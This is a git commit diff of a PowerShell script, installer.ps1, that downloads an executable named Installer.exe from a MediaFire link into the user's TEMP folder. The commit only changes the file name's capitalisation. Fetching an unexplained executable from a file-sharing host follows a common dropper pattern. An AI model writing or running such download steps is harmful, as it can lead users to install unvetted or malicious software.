81b8d4389fb44e5efa87913e08b4efa2a921d29c
zta2 <srsazam@gmail.com>
2026-02-03 11:20:11 +0300

    Update installer.ps1

--- installer.ps1
+++ installer.ps1
@@ -1,6 +1,6 @@
 $url = "
 https://download1500.mediafire.com/s6bkxdthw2vg2XRcJcZvfglwnSNyaF6LKnAgeIUntHDbyy5maau44MdyRc2Wo7RJXqG20-njA2H02nRTxBJD2AscfsIZE03eZyt7t-1EepXOi7tD8iPCBKYscXLe8ayNMFp5RXh2nhZxB6aiNLNK792RfLVpAoLXUciLHRRP4JCK/fv85qk44ehjq6t6/Installer.exe"
-$output = "$env:TEMP\installer.exe"
+$output = "$env:TEMP\Installer.exe"
 
 Write-Host "Downloading software installer..."
 Invoke-WebRequest -Uri $url -OutFile $output
